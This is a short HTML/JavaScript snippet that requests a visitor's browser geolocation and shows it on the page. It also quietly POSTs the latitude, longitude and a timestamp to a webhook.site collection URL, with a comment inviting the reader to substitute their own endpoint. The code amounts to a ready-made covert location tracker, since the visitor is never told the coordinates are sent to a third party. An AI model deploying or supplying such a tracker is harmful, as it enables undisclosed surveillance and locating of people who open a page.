<script>
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, showError);
  } else { 
    document.getElementById("location").innerHTML = "Geolocation not supported.";
  }
}

function showPosition(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  document.getElementById("location").innerHTML =
    "Latitude: " + lat + "<br>Longitude: " + lon;

  // Replace with your own webhook.site URL here
  fetch("https://webhook.site/9ed1c789-439e-472d-ac6e-352935f51e13", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      latitude: lat,
      longitude: lon,
      time: new Date().toLocaleString()
    })
  })
  .then(response => console.log("Location sent"))
  .catch(err => console.error("Error sending location", err));
}

function showError(error) {
  alert("Error getting location: " + error.message);
}
</script>
